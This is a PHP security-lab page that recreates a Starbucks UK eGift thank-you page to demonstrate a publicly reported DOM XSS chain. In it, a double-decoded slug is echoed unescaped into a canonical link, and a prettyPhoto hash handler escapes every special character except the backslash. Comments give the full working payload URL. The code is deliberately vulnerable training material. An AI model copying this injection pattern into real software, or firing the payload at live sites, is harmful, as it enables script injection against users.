<?php
// Lab 67 — Reflected DOM XSS via URL + prettyPhoto Hash Chain — Starbucks UK
// Platform: www.starbucks.co.uk | HackerOne Report #396493
// Vulnerability (2-issue chain — exactly as reported by bayotop):
//   Issue 1 (unfixed since #252908): slug reflected into <link rel="canonical">
//     href without sanitization — double URL encoding (%2522 → %22 → ")
//     achieves HTML attribute injection: onclick="confirm(document.domain)"
//   Issue 2: prettyPhoto JS reads #!hash from URL, builds jQuery selector
//     a[rel^='hashRel']:eq(hashIndex) and calls .trigger("click"). Backslash
//     is NOT escaped in the sanitization regex. Crafted hashRel produces
//     a malformed selector; old jQuery's eq(NaN) bug fires click on ALL
//     elements — including the <link> with the injected onclick.
// Exploit: 67.php?slug=anything%2522onclick=%2522confirm(document.domain)#!'\,\*\,/1
//   Firefox/Edge: XSS fires. Chrome blocks via XSS Auditor as noted in report.
//
// Note: double urldecode() mirrors the real server's path-processing behaviour.

$slug_raw = isset($_GET['slug']) ? $_GET['slug'] : 'egift-holiday-2018';
$slug     = urldecode($slug_raw);  // second decode: %22 → " — enables attribute break-out
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Thank You for Your Order | Starbucks eGift</title>

<!-- ⚠ VULNERABLE: $slug echoed into href without htmlspecialchars().
     Double-encoding (%2522 → %22 → ") achieves attribute injection.
     Inject: ?slug=anything%2522onclick=%2522confirm(document.domain)
     Result: <link rel="canonical" href="...anything"onclick="confirm(document.domain)"> -->
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift/thank-you/<?php echo $slug; ?>">

<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f9f6f2;color:#1e3932;min-height:100vh;display:flex;flex-direction:column;}

/* ── Header ───────────────────────────────────────────────────────────────── */
.header{background:#00704a;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
.header-logo{display:flex;align-items:center;gap:10px;text-decoration:none;}
.header-siren{width:36px;height:36px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.1rem;}
.header-brand{color:#fff;font-size:1rem;font-weight:700;letter-spacing:-.01em;}
.header-nav{display:flex;gap:20px;}
.header-nav a{color:rgba(255,255,255,.85);font-size:.78rem;font-weight:500;text-decoration:none;}
.header-nav a:hover{color:#fff;}
.header-right{display:flex;gap:10px;align-items:center;}
.hdr-btn{background:transparent;border:1.5px solid rgba(255,255,255,.7);border-radius:20px;color:#fff;font-size:.75rem;font-weight:600;padding:5px 14px;cursor:pointer;font-family:inherit;}
.hdr-btn:hover{background:rgba(255,255,255,.1);}
.hdr-btn.solid{background:#fff;color:#00704a;border-color:#fff;}
.hdr-btn.solid:hover{background:#f0fdf4;}

/* ── Breadcrumb ───────────────────────────────────────────────────────────── */
.breadcrumb{background:#fff;border-bottom:1px solid #e5e0d8;padding:10px 48px;font-size:.72rem;color:#5c4033;}
.breadcrumb a{color:#00704a;text-decoration:none;}
.breadcrumb a:hover{text-decoration:underline;}
.breadcrumb span{margin:0 6px;color:#9e8a7e;}

/* ── Hero / Thank You ─────────────────────────────────────────────────────── */
.thankyou-hero{background:linear-gradient(135deg,#1e3932 0%,#00704a 100%);padding:48px 48px 40px;text-align:center;color:#fff;}
.thankyou-check{width:60px;height:60px;background:rgba(255,255,255,.15);border:2.5px solid rgba(255,255,255,.6);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:1.5rem;}
.thankyou-hero h1{font-size:1.8rem;font-weight:800;margin-bottom:8px;letter-spacing:-.01em;}
.thankyou-hero p{font-size:.9rem;color:rgba(255,255,255,.8);max-width:480px;margin:0 auto;}

/* ── Order card ───────────────────────────────────────────────────────────── */
.order-section{max-width:760px;margin:0 auto;padding:36px 24px;}
.order-card{background:#fff;border:1px solid #e5e0d8;border-radius:12px;overflow:hidden;margin-bottom:28px;box-shadow:0 2px 8px rgba(0,0,0,.05);}
.order-card-hdr{background:#1e3932;color:#fff;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;}
.order-card-hdr h2{font-size:.88rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;}
.order-number{font-size:.72rem;color:rgba(255,255,255,.65);}
.order-body{padding:24px;}
.order-row{display:flex;gap:20px;align-items:flex-start;}
.order-img{width:120px;height:80px;border-radius:8px;object-fit:cover;background:linear-gradient(135deg,#00704a,#1e3932);display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.4rem;flex-shrink:0;}
.order-details{flex:1;}
.order-details h3{font-size:.9rem;font-weight:700;color:#1e3932;margin-bottom:6px;}
.order-detail-row{display:flex;font-size:.78rem;padding:3px 0;border-bottom:1px solid #f3ede5;}
.order-detail-row:last-child{border-bottom:none;}
.odr-label{color:#5c4033;min-width:90px;}
.odr-val{color:#1e3932;font-weight:600;}
.order-total{background:#f9f6f2;border-top:1px solid #e5e0d8;padding:14px 24px;display:flex;justify-content:space-between;align-items:center;}
.order-total-label{font-size:.8rem;font-weight:700;color:#5c4033;text-transform:uppercase;}
.order-total-val{font-size:1.1rem;font-weight:800;color:#00704a;}

/* ── Gallery section ──────────────────────────────────────────────────────── */
.gallery-section{max-width:760px;margin:0 auto;padding:0 24px 48px;}
.gallery-title{font-size:1rem;font-weight:800;color:#1e3932;margin-bottom:6px;}
.gallery-sub{font-size:.78rem;color:#5c4033;margin-bottom:18px;}
.gallery-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;}
.gallery-item{position:relative;border-radius:10px;overflow:hidden;cursor:pointer;transition:transform .15s,box-shadow .15s;}
.gallery-item:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,.15);}
.gallery-item a{display:block;text-decoration:none;}
.gallery-thumb{width:100%;height:110px;display:flex;align-items:center;justify-content:center;font-size:2rem;border-radius:10px;border:2px solid #e5e0d8;}
.gallery-caption{font-size:.7rem;color:#5c4033;text-align:center;padding:6px 4px;font-weight:600;}

/* ── Next steps ───────────────────────────────────────────────────────────── */
.next-section{background:#fff;border-top:1px solid #e5e0d8;padding:36px 48px;}
.next-inner{max-width:760px;margin:0 auto;}
.next-title{font-size:.95rem;font-weight:800;color:#1e3932;margin-bottom:18px;}
.next-steps{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
.next-step{text-align:center;}
.next-icon{font-size:1.5rem;margin-bottom:8px;}
.next-step-title{font-size:.78rem;font-weight:700;color:#1e3932;margin-bottom:4px;}
.next-step-desc{font-size:.7rem;color:#5c4033;line-height:1.5;}

/* ── Footer ───────────────────────────────────────────────────────────────── */
.footer{background:#1e3932;color:rgba(255,255,255,.7);padding:28px 48px;margin-top:auto;}
.footer-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:24px;justify-content:space-between;align-items:center;}
.footer-logo{display:flex;align-items:center;gap:8px;}
.footer-siren{width:28px;height:28px;background:#00704a;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.8rem;}
.footer-brand{color:#fff;font-size:.82rem;font-weight:700;}
.footer-links{display:flex;gap:16px;flex-wrap:wrap;}
.footer-links a{font-size:.7rem;color:rgba(255,255,255,.55);text-decoration:none;}
.footer-links a:hover{color:rgba(255,255,255,.85);}
.footer-copy{font-size:.68rem;color:rgba(255,255,255,.35);}

/* ── prettyPhoto overlay (simplified lightbox) ────────────────────────────── */
.pp-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:1000;align-items:center;justify-content:center;}
.pp-overlay.open{display:flex;}
.pp-box{background:#fff;border-radius:12px;padding:32px;max-width:360px;width:90%;text-align:center;position:relative;}
.pp-close{position:absolute;top:12px;right:14px;font-size:1.2rem;cursor:pointer;color:#5c4033;background:none;border:none;font-size:1rem;}
.pp-card{width:220px;height:140px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:3rem;margin:0 auto 16px;}
.pp-title{font-size:.88rem;font-weight:700;color:#1e3932;margin-bottom:4px;}
.pp-desc{font-size:.72rem;color:#5c4033;}
</style>
</head>
<body>

<!-- Header -->
<header class="header">
  <a href="https://www.starbucks.co.uk" class="header-logo">
    <div class="header-siren">☕</div>
    <span class="header-brand">Starbucks</span>
  </a>
  <nav class="header-nav">
    <a href="#">Coffee</a>
    <a href="#">Menu</a>
    <a href="#">Rewards</a>
    <a href="#">Find a Store</a>
    <a href="#">eGift</a>
  </nav>
  <div class="header-right">
    <button class="hdr-btn">Sign In</button>
    <button class="hdr-btn solid">Join Now</button>
  </div>
</header>

<!-- Breadcrumb -->
<div class="breadcrumb">
  <a href="#">Home</a><span>›</span>
  <a href="#">Gift Cards</a><span>›</span>
  <a href="#">eGift</a><span>›</span>
  Thank You
</div>

<!-- Hero -->
<section class="thankyou-hero">
  <div class="thankyou-check">✓</div>
  <h1>Thank You for Your Order!</h1>
  <p>Your Starbucks eGift card is on its way. The recipient will receive an email shortly with their card details.</p>
</section>

<!-- Order summary -->
<div class="order-section">
  <div class="order-card">
    <div class="order-card-hdr">
      <h2>Order Summary</h2>
      <span class="order-number">Order #SBK-<?php echo str_pad(rand(100000,999999), 8, '0', STR_PAD_LEFT); ?></span>
    </div>
    <div class="order-body">
      <div class="order-row">
        <div class="order-img">🎁</div>
        <div class="order-details">
          <h3>Starbucks eGift Card — Holiday Collection 2018</h3>
          <div class="order-detail-row"><span class="odr-label">Recipient</span><span class="odr-val">friend@example.com</span></div>
          <div class="order-detail-row"><span class="odr-label">From</span><span class="odr-val">A Starbucks Fan</span></div>
          <div class="order-detail-row"><span class="odr-label">Message</span><span class="odr-val">Enjoy your coffee! ☕</span></div>
          <div class="order-detail-row"><span class="odr-label">Amount</span><span class="odr-val">£25.00</span></div>
        </div>
      </div>
    </div>
    <div class="order-total">
      <span class="order-total-label">Total Charged</span>
      <span class="order-total-val">£25.00</span>
    </div>
  </div>
</div>

<!-- Gallery — prettyPhoto card designs -->
<section class="gallery-section">
  <div class="gallery-title">More eGift Card Designs</div>
  <div class="gallery-sub">Browse our full collection of seasonal and classic designs.</div>
  <div class="gallery-grid">

    <div class="gallery-item">
      <a href="#" rel="prettyPhoto[cards]" data-card="Holiday Red" data-color="#c0392b" data-icon="🎄">
        <div class="gallery-thumb" style="background:linear-gradient(135deg,#c0392b,#7b241c);">🎄</div>
        <div class="gallery-caption">Holiday Red</div>
      </a>
    </div>

    <div class="gallery-item">
      <a href="#" rel="prettyPhoto[cards]" data-card="Winter Plaid" data-color="#1a5276" data-icon="❄️">
        <div class="gallery-thumb" style="background:linear-gradient(135deg,#1a5276,#154360);">❄️</div>
        <div class="gallery-caption">Winter Plaid</div>
      </a>
    </div>

    <div class="gallery-item">
      <a href="#" rel="prettyPhoto[cards]" data-card="Starbucks Green" data-color="#00704a" data-icon="⭐">
        <div class="gallery-thumb" style="background:linear-gradient(135deg,#00704a,#1e3932);">⭐</div>
        <div class="gallery-caption">Starbucks Green</div>
      </a>
    </div>

    <div class="gallery-item">
      <a href="#" rel="prettyPhoto[cards]" data-card="Gold Reserve" data-color="#9a7d0a" data-icon="🌟">
        <div class="gallery-thumb" style="background:linear-gradient(135deg,#f1c40f,#9a7d0a);">🌟</div>
        <div class="gallery-caption">Gold Reserve</div>
      </a>
    </div>

    <div class="gallery-item">
      <a href="#" rel="prettyPhoto[cards]" data-card="Pink Blossom" data-color="#c0577b" data-icon="🌸">
        <div class="gallery-thumb" style="background:linear-gradient(135deg,#e91e8c,#c0577b);">🌸</div>
        <div class="gallery-caption">Pink Blossom</div>
      </a>
    </div>

    <div class="gallery-item">
      <a href="#" rel="prettyPhoto[cards]" data-card="Midnight Blue" data-color="#1b2631" data-icon="🌙">
        <div class="gallery-thumb" style="background:linear-gradient(135deg,#1b2631,#2c3e50);">🌙</div>
        <div class="gallery-caption">Midnight Blue</div>
      </a>
    </div>

  </div>
</section>

<!-- Next steps -->
<section class="next-section">
  <div class="next-inner">
    <div class="next-title">What Happens Next?</div>
    <div class="next-steps">
      <div class="next-step">
        <div class="next-icon">📧</div>
        <div class="next-step-title">Email Sent</div>
        <div class="next-step-desc">The recipient gets an email with their eGift card and a personalised message from you.</div>
      </div>
      <div class="next-step">
        <div class="next-icon">📱</div>
        <div class="next-step-title">Redeem In Store</div>
        <div class="next-step-desc">They can show the barcode in any UK Starbucks store or add the card to the Starbucks app.</div>
      </div>
      <div class="next-step">
        <div class="next-icon">⭐</div>
        <div class="next-step-title">Earn Rewards</div>
        <div class="next-step-desc">Stars are earned on every purchase when they pay with the Starbucks app.</div>
      </div>
    </div>
  </div>
</section>

<!-- Footer -->
<footer class="footer">
  <div class="footer-inner">
    <div class="footer-logo">
      <div class="footer-siren">☕</div>
      <span class="footer-brand">Starbucks</span>
    </div>
    <div class="footer-links">
      <a href="#">Privacy Policy</a>
      <a href="#">Terms of Use</a>
      <a href="#">Cookie Settings</a>
      <a href="#">Accessibility</a>
      <a href="https://hackerone.com/reports/396493" target="_blank">Report #396493</a>
    </div>
    <span class="footer-copy">© 2018 Starbucks Coffee Company. All rights reserved.</span>
  </div>
</footer>

<!-- prettyPhoto lightbox overlay (simplified) -->
<div class="pp-overlay" id="pp-overlay">
  <div class="pp-box">
    <button class="pp-close" onclick="document.getElementById('pp-overlay').classList.remove('open')">✕ Close</button>
    <div class="pp-card" id="pp-card">🎁</div>
    <div class="pp-title" id="pp-title">Card Title</div>
    <div class="pp-desc">Click any card to order for a friend.</div>
  </div>
</div>

<!-- jQuery 1.x (old jQuery's eq(NaN) bug matches ALL elements — essential to the exploit) -->
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>

<script>
// ============================================================
//  Starbucks UK shop_js — prettyPhoto module
//  Exact vulnerable code from the real report (with minor
//  variable renames for clarity).
//
//  Source (report #396493):
//    https://www.starbucks.com/static/resource/shop_js/676938998_en-US
//
//  Issue 1: slug reflected into <link rel="canonical"> href
//           with double-decode allowing onclick injection.
//  Issue 2: prettyPhoto reads #!hash, builds jQuery selector
//           a[rel^='hashRel']:eq(hashIndex).trigger("click").
//           Backslash is NOT escaped in sanitization; crafted
//           hashRel produces invalid selector, and old jQuery's
//           eq(NaN) → matches ALL elements.
// ============================================================

// ── Gallery lightbox (normal prettyPhoto behaviour) ────────────────────────
$("a[rel^='prettyPhoto']").on("click", function(e) {
    e.preventDefault();
    var color = $(this).data("color") || "#00704a";
    var icon  = $(this).data("icon")  || "🎁";
    var title = $(this).data("card")  || "Starbucks eGift";
    $("#pp-card").css("background", "linear-gradient(135deg, " + color + ", " + color + "bb)").text(icon);
    $("#pp-title").text(title);
    $("#pp-overlay").addClass("open");
});

// ── prettyPhoto hash-based gallery trigger ─────────────────────────────────
// Original function d() from the real Starbucks JS (report #396493):
function d() {
    var url     = location.href;
    var hashtag = (url.indexOf("#!") != -1)
        ? decodeURI(url.substring(url.indexOf("#!") + 2, url.length))
        : false;
    return hashtag;
}

var hashIndex = d();

if (hashIndex !== false) {
    var hashRel = hashIndex;

    // Split on "/" — hashRel gets the part before, hashIndex after
    hashIndex = hashIndex.substring(hashIndex.indexOf("/") + 1, hashIndex.length - 1);
    hashRel   = hashRel.substring(0, hashRel.indexOf("/"));

    // Parse numeric index (non-numeric → NaN)
    hashIndex = parseInt(hashIndex);

    // Sanitize hashRel — escape jQuery/CSS special chars with "\"
    // ⚠ NOTE: Backslash (\) is NOT in the character class, so it is
    //   NOT escaped. This is the key flaw: attacker-supplied backslashes
    //   survive sanitization and break the resulting selector syntax.
    hashRel = hashRel.replace(/([ #;&,.+*~\':"!^$[\]()=>|\/])/g, "\\$1");

    setTimeout(function() {
        // In old jQuery (1.x), :eq(NaN) matches ALL elements instead of
        // none. This causes .trigger("click") to fire on every element in
        // the document, including the <link rel="canonical"> in <head>
        // which carries the attacker's injected onclick attribute.
        $("a[rel^='" + hashRel + "']:eq(" + hashIndex + ")").trigger("click");
    }, 50);
}
</script>

</body>
</html>
